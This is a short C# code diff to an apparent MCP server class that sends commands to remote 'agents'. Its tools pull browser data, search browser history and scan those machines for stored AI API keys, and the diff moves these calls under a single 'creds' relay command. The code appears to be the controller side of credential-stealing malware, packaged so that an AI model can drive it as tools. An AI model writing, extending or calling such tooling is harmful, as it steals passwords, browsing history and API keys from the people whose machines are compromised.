@@ -18,10 +18,10 @@ public sealed class DataTools
         [Description("Limit for pagination (default 100)")] int limit = 100)
     {
         if (!string.IsNullOrEmpty(keyword))
-            return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.browser.search",
-                new { type = browser, keyword }, TimeSpan.FromSeconds(60));
-        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.browser",
-            new { type = browser, offset, limit }, TimeSpan.FromSeconds(60));
+            return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
+                new { op = "browser_search", type = browser, keyword }, TimeSpan.FromSeconds(60));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
+            new { op = "browser", type = browser, offset, limit }, TimeSpan.FromSeconds(60));
     }
 
     [McpServerTool, Description("Extract browser history from an agent (with optional keyword search)")]
@@ -35,10 +35,10 @@ public sealed class DataTools
         [Description("Limit for pagination (default 100)")] int limit = 100)
     {
         if (!string.IsNullOrEmpty(keyword))
-            return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.browser.search",
-                new { type = browser, keyword }, TimeSpan.FromSeconds(60));
-        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.browser",
-            new { type = browser, offset, limit }, TimeSpan.FromSeconds(60));
+            return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
+                new { op = "browser_search", type = browser, keyword }, TimeSpan.FromSeconds(60));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
+            new { op = "browser", type = browser, offset, limit }, TimeSpan.FromSeconds(60));
     }
 
     [McpServerTool, Description("Scan for AI API keys (OpenAI, Anthropic, etc.) on an agent")]
@@ -47,7 +47,7 @@ public sealed class DataTools
         AgentService agents,
         [Description("Target agent ID")] string agentId)
     {
-        return await McpUtils.RelayOrError(relay, agents, agentId, "othersoft.ai",
-            null, TimeSpan.FromSeconds(60));
+        return await McpUtils.RelayOrError(relay, agents, agentId, "creds",
+            new { op = "ai" }, TimeSpan.FromSeconds(60));
     }
 }
